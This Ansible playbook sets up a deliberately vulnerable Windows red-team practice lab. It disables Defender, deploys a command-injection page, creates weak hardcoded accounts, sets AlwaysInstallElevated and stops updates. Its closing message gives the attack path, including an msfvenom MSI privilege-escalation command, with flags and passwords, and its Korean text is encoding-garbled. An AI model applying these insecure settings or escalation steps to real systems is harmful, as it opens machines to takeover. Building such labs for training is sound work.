---
- name: Red Team Windows Lab Setup
  hosts: windows_targets
  gather_facts: yes
  
  tasks:
    - name: Enable RDP
      win_firewall_rule:
        name: "Remote Desktop"
        enable: yes
        state: present
        
    - name: Configure RDP to allow connections
      win_regedit:
        path: HKLM:\System\CurrentControlSet\Control\Terminal Server
        name: fDenyTSConnections
        data: 0
        type: dword
        
    - name: Disable Windows Defender Real-time Protection
      win_shell: |
        Set-MpPreference -DisableRealtimeMonitoring $true -Force
      ignore_errors: yes

    - name: Install IIS Web Server
      win_feature:
        name: Web-Server
        state: present
        include_management_tools: yes
        include_all_sub_features: yes

    - name: Create directory for web application
      win_file:
        path: C:\inetpub\wwwroot\webapp
        state: directory

    - name: Copy command injection test page
      win_copy:
        src: files/cmd_injection.aspx
        dest: C:\inetpub\wwwroot\webapp\cmd_injection.aspx

    - name: Allow ASP.NET 4.0 in IIS
      win_shell: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -i -enable
      ignore_errors: yes

    - name: Configure IIS to run ASP.NET 4.0 applications
      win_shell: |
        Import-Module WebAdministration
        Set-ItemProperty -Path "IIS:\AppPools\DefaultAppPool" -Name "managedRuntimeVersion" -Value "v4.0"
      ignore_errors: yes

    - name: Open HTTP port in firewall
      win_firewall_rule:
        name: "HTTP"
        localport: 80
        action: allow
        direction: inbound
        protocol: TCP
        state: present
        enabled: yes
        
    - name: Create standard user for privilege escalation demo
      win_user:
        name: lowpriv
        password: User123!
        groups:
          - Users
        password_never_expires: yes
      ignore_errors: yes
      
    - name: Create admin user for demo
      win_user:
        name: redteam
        password: RedTeam123!
        groups:
          - Administrators
        password_never_expires: yes
      ignore_errors: yes

    - name: Set AlwaysInstallElevated registry key (User context)
      win_regedit:
        path: HKCU:\Software\Policies\Microsoft\Windows\Installer
        name: AlwaysInstallElevated
        data: 1
        type: dword
      become: yes
      become_method: runas
      become_user: lowpriv # lowpriv ì‚¬ìš©ìë¡œ ì‹¤í–‰

    - name: Set AlwaysInstallElevated registry key (Machine context)
      win_regedit:
        path: HKLM:\Software\Policies\Microsoft\Windows\Installer
        name: AlwaysInstallElevated
        data: 1
        type: dword

    - name: Create user flag for lowpriv user
      win_copy:
        content: "RT{CMD_INJECTION_USER_FLAG_2025}"
        dest: C:\Users\lowpriv\Desktop\user_flag.txt
      become: yes
      become_method: runas
      become_user: lowpriv
        
    - name: Disable Windows Update (to maintain vulnerability)
      win_service:
        name: wuauserv
        state: stopped
        start_mode: disabled
      ignore_errors: yes
      
    - name: Create final flag in Administrator directory
      win_copy:
        content: "RT{WINDOWS_FULL_COMPROMISE_ALWAYSINSTALLELEVATED_2025}"
        dest: C:\Users\Administrator\Desktop\final_flag.txt
      ignore_errors: yes
        
    - name: Display setup completion message
      debug:
        msg: |
          ===== Windows Red Team Lab Setup Complete =====
          
          ğŸ¯ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ (2ë‹¨ê³„):
          1ï¸âƒ£ ì´ˆê¸° ì¹¨íˆ¬: OS Command Injection (Web Application)
             - Target: http://{{ ansible_host }}/webapp/cmd_injection.aspx?cmd=whoami
             - Method: ì›¹ í˜ì´ì§€ íŒŒë¼ë¯¸í„°ë¥¼ í†µí•œ ëª…ë ¹ì–´ ì‚½ì…
             - Flag: (ì›¹ í˜ì´ì§€ì—ì„œ 'type C:\Users\lowpriv\Desktop\user_flag.txt' ì‹¤í–‰ ì‹œ í™•ì¸ ê°€ëŠ¥)
          
          2ï¸âƒ£ ê¶Œí•œ ìƒìŠ¹: AlwaysInstallElevated
             - Method: íŠ¹ì • ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ê°€ ì„¤ì •ëœ ê²½ìš° MSI íŒ¨í‚¤ì§€ë¥¼ SYSTEM ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ ê°€ëŠ¥
             - Tool: msfvenom -p windows/exec CMD="cmd /c echo RT{ALWAYS_INSTALL_ELEVATED_SUCCESS_2025} > C:\Users\Administrator\Desktop\privesc_flag.txt" -f msi -o exploit.msi
             - Command: msiexec /i C:\path\to\exploit.msi /quiet
             - Flag: RT{ALWAYS_INSTALL_ELEVATED_SUCCESS_2025} (privesc_flag.txt í™•ì¸)
             - Final Flag: RT{WINDOWS_FULL_COMPROMISE_ALWAYSINSTALLELEVATED_2025} (C:\Users\Administrator\Desktop\final_flag.txt)
          
          ğŸ–¥ï¸ ì ‘ì† ì •ë³´:
             - Web: http://{{ ansible_host }}/webapp/cmd_injection.aspx
             - RDP: {{ ansible_host }}:3389 (lowpriv/User123!)
          
          ğŸš© í”Œë˜ê·¸ ì •ë³´:
          - User Flag: RT{CMD_INJECTION_USER_FLAG_2025}
          - Privesc Flag: RT{ALWAYS_INSTALL_ELEVATED_SUCCESS_2025}
          - Root/Admin Flag: RT{WINDOWS_FULL_COMPROMISE_ALWAYSINSTALLELEVATED_2025}
          
          (ì°¸ê³ : user_flag.txtëŠ” lowpriv ì‚¬ìš©ìë¡œ ë¡œê·¸ì¸ ì‹œ ë°”íƒ•í™”ë©´ì— ìƒì„±í•´ì£¼ì„¸ìš”. ë˜ëŠ” Ansibleë¡œ ì¶”ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.) 